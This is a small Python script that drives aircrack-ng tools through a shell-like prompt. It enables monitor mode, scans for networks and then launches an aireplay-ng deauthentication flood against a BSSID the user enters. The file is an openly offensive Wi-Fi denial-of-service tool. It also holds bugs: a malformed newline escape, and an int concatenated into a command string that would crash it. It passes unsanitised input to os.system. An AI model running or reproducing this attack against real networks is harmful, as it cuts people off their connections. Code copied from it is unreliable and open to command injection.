import os
from threading import Timer


os.system("iwconfig")



print("/n Choose Your Adapter : \n")
adapter=input("( Adapter Name ) : ")
print("/n ADAPTER NAME SAVED")


def monitormode():
    mmd= "airmon-ng start "+adapter
    code1= "airodump-ng "+adapter+"mon"
    os.system(mmd)
    os.system(code1)
    bssid= input("( BSSID ) : ")
    secon= int(input("( time in sec. ) : "))
    attack = secon*6

    code1="aireplay-ng --deauth "+attack+" -a "+bssid+" "+adapter+"mon"
    os.system(code1)

def help():
    print("")
    print("1. start                     To Start the script")
    print("2. stop                      To Stop Script ")

while True :
    bash = input ("( Shell ) : ")

    if bash == "start" :
        monitormode()

    if bash =="stop" :
        coder= "airmon-ng stop "+adapter+"mon"
        os.system(coder)

    if bash == "help" :
        help()
